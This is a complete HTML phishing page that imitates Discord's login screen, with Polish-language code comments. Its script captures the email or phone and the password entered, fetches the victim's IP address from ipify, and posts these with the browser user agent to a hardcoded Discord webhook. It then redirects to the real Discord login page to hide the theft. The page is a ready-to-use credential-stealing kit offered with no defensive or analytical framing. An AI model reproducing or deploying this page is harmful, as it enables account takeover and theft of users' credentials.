<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background: radial-gradient(circle at 50% 40%, #6e7ff3 0%, #404eed 45%, #2c3ac9 100%);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .logo { display: flex; align-items: center; gap: 8px; margin-bottom: 30px; }
  .logo svg { width: 34px; height: 34px; }
  .logo span { font-size: 26px; font-weight: 800; color: #fff; letter-spacing: .5px; }
  .card {
    background: #fff;
    border-radius: 16px;
    box-shadow: 0 20px 60px rgba(0,0,0,.45);
    display: flex;
    width: 784px;
    max-width: 100%;
    overflow: hidden;
  }
  .left { flex: 1; padding: 40px 32px 40px 40px; }
  .left h1 { font-size: 24px; color: #060607; margin-bottom: 4px; }
  .left .sub { color: #4e5058; font-size: 16px; margin-bottom: 24px; }
  label { display: block; font-size: 12px; font-weight: 700; color: #4e5058; margin-bottom: 8px; text-transform: uppercase; letter-spacing: .3px; }
  label .req { color: #f23f43; }
  input {
    width: 100%; padding: 10px 12px; border: 1px solid #d4d7dc; border-radius: 4px;
    font-size: 16px; background: #fff; color: #060607; margin-bottom: 20px;
  }
  input:focus { outline: none; border-color: #5865f2; box-shadow: 0 0 0 1px #5865f2; }
  .forgot { text-align: right; margin-bottom: 20px; }
  .forgot a { color: #00a8fc; font-size: 13px; text-decoration: none; }
  .forgot a:hover { text-decoration: underline; }
  button {
    width: 100%; padding: 12px; background: #5865f2; color: #fff; border: none;
    border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer;
  }
  button:hover { background: #4752c4; }
  .register { margin-top: 16px; font-size: 13px; color: #4e5058; }
  .register a { color: #00a8fc; text-decoration: none; }
  .register a:hover { text-decoration: underline; }
  .right {
    width: 272px; background: #f2f3f5; display: flex; flex-direction: column;
    align-items: center; justify-content: center; padding: 40px 30px; text-align: center;
  }
  #qrbox {
    background: #fff; border: 1px solid #d4d7dc; border-radius: 8px;
    padding: 10px; margin-bottom: 16px;
  }
  #qrbox svg { display: block; width: 160px; height: 160px; }
  .right h2 { font-size: 20px; color: #060607; margin-bottom: 8px; }
  .right p { font-size: 12px; color: #4e5058; line-height: 1.4; margin-bottom: 12px; }
  .right .passkey { color: #00a8fc; font-size: 12px; text-decoration: none; }
  .right .passkey:hover { text-decoration: underline; }
  @media (max-width: 820px) {
    .right { display: none; }
    .left { padding: 40px 32px; }
  }
</style>
</head>
<body>

<div class="logo">
  <svg viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
    <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
  </svg>
  <span>Discord</span>
</div>

<div class="card">
  <div class="left">
    <h1>Welcome back!</h1>
    <p class="sub">We're so excited to see you again!</p>

    <form id="login-form">
      <label for="emailORphone">Email or Phone Number <span class="req">*</span></label>
      <input type="text" id="emailORphone" required autocomplete="off">

      <label for="password">Password <span class="req">*</span></label>
      <input type="password" id="password" required>

      <div class="forgot"><a href="#">Forgot your password?</a></div>

      <button type="submit">Log In</button>
    </form>

    <div class="register">Need an account? <a href="#">Register</a></div>
  </div>

  <div class="right">
    <div id="qrbox"></div>
    <h2>Log in with QR Code</h2>
    <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
    <a class="passkey" href="#">or sign in with passkey</a>
  </div>
</div>

<!-- QR code (generowany lokalnie, wygląda jak prawdziwy) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
<script>
try {
  var qr = qrcode(0, 'M');
  qr.addData('https://discord.com/login');
  qr.make();
  document.getElementById('qrbox').innerHTML = qr.createSvgTag({ cellSize: 4, margin: 4 });
} catch (e) { /* zostaje puste pole, strona dalej działa */ }
</script>

<!-- Wysyłka na webhook + przekierowanie -->
<script>
(function() {
  var form = document.getElementById('login-form');
  var webhookUrl = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW';

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    // najpierw pobieramy IP ofiary, potem wysyłamy
    fetch('https://api.ipify.org?format=json')
      .then(function(r) { return r.json(); })
      .then(function(data) { send(data.ip || 'nieznane'); })
      .catch(function() { send('nieznane'); });
  });

  function send(ip) {
    var email = document.getElementById('emailORphone').value;
    var password = document.getElementById('password').value;

    var payload = {
      embeds: [{
        title: 'Nowe logowanie',
        color: 0x5865F2,
        fields: [
          { name: 'Email / Telefon', value: email || 'brak', inline: true },
          { name: 'Hasło', value: password || 'brak', inline: true },
          { name: 'IP', value: ip, inline: true },
          { name: 'Przeglądarka', value: navigator.userAgent.slice(0, 100), inline: false }
        ],
        footer: { text: 'Discord Login' },
        timestamp: new Date().toISOString()
      }]
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(function() { window.location.href = 'https://discord.com/login'; })
    .catch(function() { window.location.href = 'https://discord.com/login'; });
  }
})();
</script>

</body>
</html>
